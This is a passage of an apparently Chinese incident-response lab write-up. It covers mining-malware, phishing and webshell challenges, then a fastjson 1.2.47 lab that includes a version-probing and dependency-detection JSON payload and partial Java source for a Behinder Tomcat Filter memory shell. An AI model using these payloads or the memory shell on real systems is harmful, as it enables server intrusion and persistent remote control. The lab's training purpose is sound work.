            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164533747.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164533747.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164533747.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530164533747">
    </a></figure></p>
<p>5.对黑客上传的挖矿病毒进行分析，获取隐藏的Flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{websec_True@888!}
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看计划任务<code>crontab -l</code>，并没有，<code>cat /etc/crontab</code></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164952367.png?imageSlim" title="image-20240530164952367" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164952367.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164952367.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164952367.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164952367.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164952367.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530164952367">
    </a></figure></p>
<p>文件为ldm，<code>find / -name &quot;ldm&quot;</code>发现文件存在于/etc/.cache/ldm</p>
<p><code>cat ldm</code></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530165043367.png?imageSlim" title="image-20240530165043367" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530165043367.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530165043367.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530165043367.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530165043367.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530165043367.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530165043367">
    </a></figure></p>
<p>解码得到flag</p>
<h2 id="第七章-常见攻击事件分析--钓鱼邮件" class="headerLink">
    <a href="#%e7%ac%ac%e4%b8%83%e7%ab%a0-%e5%b8%b8%e8%a7%81%e6%94%bb%e5%87%bb%e4%ba%8b%e4%bb%b6%e5%88%86%e6%9e%90--%e9%92%93%e9%b1%bc%e9%82%ae%e4%bb%b6" class="header-mark"></a>第七章 常见攻击事件分析&ndash;钓鱼邮件</h2><p>1.请分析获取黑客发送钓鱼邮件时使用的IP，flag格式： flag{11.22.33.44}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">121.204.224.15
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528152940474.png?imageSlim" title="image-20240528152940474" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528152940474.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528152940474.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528152940474.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528152940474.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528152940474.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528152940474">
    </a></figure></p>
<p>2.请分析获取黑客钓鱼邮件中使用的木马程序的控制端IP，flag格式：flag{11.22.33.44}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">107.16.111.57
</span></span></code></pre></td></tr></table>
</div>
</div><p>附件下载下来，放到云沙箱中分析</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153225816.png?imageSlim" title="image-20240528153225816" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153225816.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153225816.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153225816.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153225816.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153225816.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528153225816">
    </a></figure></p>
<p>3.黑客在被控服务器上创建了webshell，请分析获取webshell的文件名，请使用完整文件格式，flag格式：flag{/var/www/html/shell.php}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"></code></pre></td></tr></table>
</div>
</div><p>d盾扫描www目录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">flag</span><span class="p">{</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">ebak</span><span class="o">/</span><span class="n">ReData</span><span class="o">.</span><span class="n">php</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153321674.png?imageSlim" title="image-20240528153321674" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153321674.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153321674.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153321674.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153321674.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153321674.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528153321674">
    </a></figure></p>
<p>4.flag4: 黑客在被控服务器上创建了内网代理隐蔽通信隧道，请分析获取该隧道程序的文件名，请使用完整文件路径，flag格式：flag{/opt/apache2/shell}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">flag</span><span class="p">{</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">mysql</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在var/tmp/proc目录下发现my.conf类似流量穿透工具配置，可推测mysql为隐蔽通信隧道</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153838841.png?imageSlim" title="image-20240528153838841" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153838841.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153838841.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153838841.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153838841.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528153838841.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528153838841">
    </a></figure></p>
<h2 id="第八章-内存马分析-java03-fastjson" class="headerLink">
    <a href="#%e7%ac%ac%e5%85%ab%e7%ab%a0-%e5%86%85%e5%ad%98%e9%a9%ac%e5%88%86%e6%9e%90-java03-fastjson" class="header-mark"></a>第八章 内存马分析-java03-fastjson</h2><p>1.fastjson版本作为 flag 提交 flag{x.x.66}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{1.2.47}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;fscan64.exe -h 52.83.21.132 -p 1-65535
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105458982.png?imageSlim" title="image-20240530105458982" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105458982.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105458982.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105458982.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105458982.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105458982.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530105458982">
    </a></figure></p>
<p>发现存在web页面，对登录框的请求体中去掉一个}，发成报错，但委会显fastjson相关字符</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105723828.png?imageSlim" title="image-20240530105723828" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105723828.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105723828.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105723828.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105723828.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105723828.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530105723828">
    </a></figure></p>
<p>直接探测fastjson版本，依旧没探测到发fastjson相关字段</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105823900.png?imageSlim" title="image-20240530105823900" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105823900.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105823900.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105823900.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105823900.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530105823900.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530105823900">
    </a></figure></p>
<p>Unicode编码之后得到版本的回显，可能是加了waf</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530110516740.png?imageSlim" title="image-20240530110516740" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530110516740.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530110516740.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530110516740.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530110516740.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530110516740.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530110516740">
    </a></figure></p>
<p>2.内核版本作为 flag 提交 flag{Dexxxxxxxxxux}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{Debian 4.19.260-1 (2022-09-29) x86_64 GNU/Linux}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Fastjson1.2.47版本以下存在mappings缓存通杀绕过，利用的方式为JNDI</p>
<blockquote>
<p>JNDI利用条件</p>
<ul>
<li>非严格意义的出网，比如这里我们控制了外网主机，可以使用该主机作为server端提供ldap或rmi</li>
<li>受到JDK版本限制，JDK8u191后受到trusturlcodebase限制远程加载，但也有绕过方法。这里因为机器内JDK版本较高，JNDI注入并不太合适，所以需要找其他利用链。</li>
</ul>
</blockquote>
<p>随后探测存在的依赖，利用Character转换报错可以判断存在何种依赖，当存在该类时会报出类型转换错误，否则无显示，同样，这里@type也需要编码。通过这种方法结合已知的FastJson利用链所需要的依赖类，最终探测服务中存在C3P0依赖。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">&#34;x&#34;:{
</span></span><span class="line"><span class="cl">&#34;\u0040\u0074\u0079\u0070\u0065&#34;:&#34;java.lang.Character&#34;{&#34;\u0040\u0074\u0079\u0070\u0065&#34;:&#34;java.lang.Class&#34;,
</span></span><span class="line"><span class="cl">&#34;val&#34;:&#34;com.mchange.v2.c3p0.DataSources&#34;}}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530111139430.png?imageSlim" title="image-20240530111139430" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530111139430.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530111139430.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530111139430.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530111139430.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530111139430.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530111139430">
    </a></figure></p>
<p>先找一个冰蝎内存马:Tomcat的Filter型内存马,但因为是TemplatesImpl这条链加载字节码，所以需要extends AbstractTranslet并重写两个方法，否则加载不了这个类。编译为IceShell.class：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">com</span><span class="o">.</span><span class="n">sun</span><span class="o">.</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">xalan</span><span class="o">.</span><span class="n">internal</span><span class="o">.</span><span class="n">xsltc</span><span class="o">.</span><span class="n">DOM</span><span class="p">;</span><span class="n">import</span> <span class="n">com</span><span class="o">.</span><span class="n">sun</span><span class="o">.</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">xalan</span><span class="o">.</span><span class="n">internal</span><span class="o">.</span><span class="n">xsltc</span><span class="o">.</span><span class="n">TransletException</span><span class="p">;</span><span class="n">import</span> <span class="n">com</span><span class="o">.</span><span class="n">sun</span><span class="o">.</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">xalan</span><span class="o">.</span><span class="n">internal</span><span class="o">.</span><span class="n">xsltc</span><span class="o">.</span><span class="n">runtime</span><span class="o">.</span><span class="n">AbstractTranslet</span><span class="p">;</span><span class="n">import</span> <span class="n">com</span><span class="o">.</span><span class="n">sun</span><span class="o">.</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">xml</span><span class="o">.</span><span class="n">internal</span><span class="o">.</span><span class="n">dtm</span><span class="o">.</span><span class="n">DTMAxisIterator</span><span class="p">;</span><span class="n">import</span> <span class="n">com</span><span class="o">.</span><span class="n">sun</span><span class="o">.</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">xml</span><span class="o">.</span><span class="n">internal</span><span class="o">.</span><span class="n">serializer</span><span class="o">.</span><span class="n">SerializationHandler</span><span class="p">;</span><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">IOException</span><span class="p">;</span><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">reflect</span><span class="o">.</span><span class="n">Constructor</span><span class="p">;</span><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">reflect</span><span class="o">.</span><span class="n">Field</span><span class="p">;</span><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">reflect</span><span class="o">.</span><span class="n">Method</span><span class="p">;</span><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">Base64</span><span class="p">;</span><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">HashMap</span><span class="p">;</span><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">Map</span><span class="p">;</span><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">crypto</span><span class="o">.</span><span class="n">Cipher</span><span class="p">;</span><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">crypto</span><span class="o">.</span><span class="n">spec</span><span class="o">.</span><span class="n">SecretKeySpec</span><span class="p">;</span><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">DispatcherType</span><span class="p">;</span><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">Filter</span><span class="p">;</span><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">FilterChain</span><span class="p">;</span><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">FilterConfig</span><span class="p">;</span><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">ServletException</span><span class="p">;</span><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">ServletRequest</span><span class="p">;</span><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">ServletResponse</span><span class="p">;</span><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">http</span><span class="o">.</span><span class="n">HttpServletRequest</span><span class="p">;</span><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">http</span><span class="o">.</span><span class="n">HttpServletResponse</span><span class="p">;</span><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">http</span><span class="o">.</span><span class="n">HttpSession</span><span class="p">;</span><span class="n">import</span> <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">Context</span><span class="p">;</span><span class="n">import</span> <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">core</span><span class="o">.</span><span class="n">ApplicationFilterConfig</span><span class="p">;</span><span class="n">import</span> <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">core</span><span class="o">.</span><span class="n">StandardContext</span><span class="p">;</span><span class="n">import</span> <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">loader</span><span class="o">.</span><span class="n">WebappClassLoaderBase</span><span class="p">;</span><span class="n">import</span> <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">tomcat</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">descriptor</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">FilterDef</span><span class="p">;</span><span class="n">import</span> <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">tomcat</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">descriptor</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">FilterMap</span><span class="p">;</span><span class="n">import</span> <span class="n">sun</span><span class="o">.</span><span class="n">misc</span><span class="o">.</span><span class="n">BASE64Decoder</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">public</span> <span class="k">class</span> <span class="n">IceShell</span> <span class="k">extends</span> <span class="n">AbstractTranslet</span> <span class="n">implements</span> <span class="n">Filter</span> <span class="p">{</span>    <span class="n">private</span> <span class="n">final</span> <span class="ne">String</span> <span class="n">pa</span> <span class="o">=</span> <span class="s2">&#34;3ad2fddfe8bad8e6&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">IceShell</span><span class="p">()</span> <span class="p">{</span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">void</span> <span class="n">init</span><span class="p">(</span><span class="n">FilterConfig</span> <span class="n">filterConfig</span><span class="p">)</span> <span class="n">throws</span> <span class="n">ServletException</span> <span class="p">{</span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">void</span> <span class="n">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="p">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="p">,</span> <span class="n">FilterChain</span> <span class="n">filterChain</span><span class="p">)</span> <span class="n">throws</span> <span class="n">IOException</span><span class="p">,</span> <span class="n">ServletException</span> <span class="p">{</span>        <span class="n">HttpServletRequest</span> <span class="n">request</span> <span class="o">=</span> <span class="p">(</span><span class="n">HttpServletRequest</span><span class="p">)</span><span class="n">servletRequest</span><span class="p">;</span>        <span class="n">HttpServletResponse</span> <span class="n">response</span> <span class="o">=</span> <span class="p">(</span><span class="n">HttpServletResponse</span><span class="p">)</span><span class="n">servletResponse</span><span class="p">;</span>        <span class="n">HttpSession</span> <span class="n">session</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">getSession</span><span class="p">();</span>        <span class="n">Map</span><span class="o">&lt;</span><span class="ne">String</span><span class="p">,</span> <span class="ne">Object</span><span class="o">&gt;</span> <span class="n">pageContext</span> <span class="o">=</span> <span class="n">new</span> <span class="n">HashMap</span><span class="p">();</span>        <span class="n">pageContext</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&#34;session&#34;</span><span class="p">,</span> <span class="n">session</span><span class="p">);</span>        <span class="n">pageContext</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&#34;request&#34;</span><span class="p">,</span> <span class="n">request</span><span class="p">);</span>        <span class="n">pageContext</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&#34;response&#34;</span><span class="p">,</span> <span class="n">response</span><span class="p">);</span>        <span class="n">ClassLoader</span> <span class="n">cl</span> <span class="o">=</span> <span class="ne">Thread</span><span class="o">.</span><span class="n">currentThread</span><span class="p">()</span><span class="o">.</span><span class="n">getContextClassLoader</span><span class="p">();</span>        <span class="k">if</span> <span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">getMethod</span><span class="p">()</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">))</span> <span class="p">{</span>            <span class="n">Class</span> <span class="n">Lclass</span><span class="p">;</span>            <span class="k">if</span> <span class="p">(</span><span class="n">cl</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getName</span><span class="p">()</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&#34;java.lang.ClassLoader&#34;</span><span class="p">))</span> <span class="p">{</span>                <span class="n">Lclass</span> <span class="o">=</span> <span class="n">cl</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">();</span>                <span class="n">this</span><span class="o">.</span><span class="n">RushThere</span><span class="p">(</span><span class="n">Lclass</span><span class="p">,</span> <span class="n">cl</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">);</span>            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">cl</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getName</span><span class="p">()</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&#34;java.lang.ClassLoader&#34;</span><span class="p">))</span> <span class="p">{</span>                <span class="n">Lclass</span> <span class="o">=</span> <span class="n">cl</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">();</span>                <span class="n">this</span><span class="o">.</span><span class="n">RushThere</span><span class="p">(</span><span class="n">Lclass</span><span class="p">,</span> <span class="n">cl</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">);</span>            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">cl</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getName</span><span class="p">()</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&#34;java.lang.ClassLoader&#34;</span><span class="p">))</span> <span class="p">{</span>                <span class="n">Lclass</span> <span class="o">=</span> <span class="n">cl</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">();</span>                <span class="n">this</span><span class="o">.</span><span class="n">RushThere</span><span class="p">(</span><span class="n">Lclass</span><span class="p">,</span> <span class="n">cl</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">);</span>            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">cl</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getName</span><span class="p">()</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&#34;java.lang.ClassLoader&#34;</span><span class="p">))</span> <span class="p">{</span>                <span class="n">Lclass</span> <span class="o">=</span> <span class="n">cl</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span 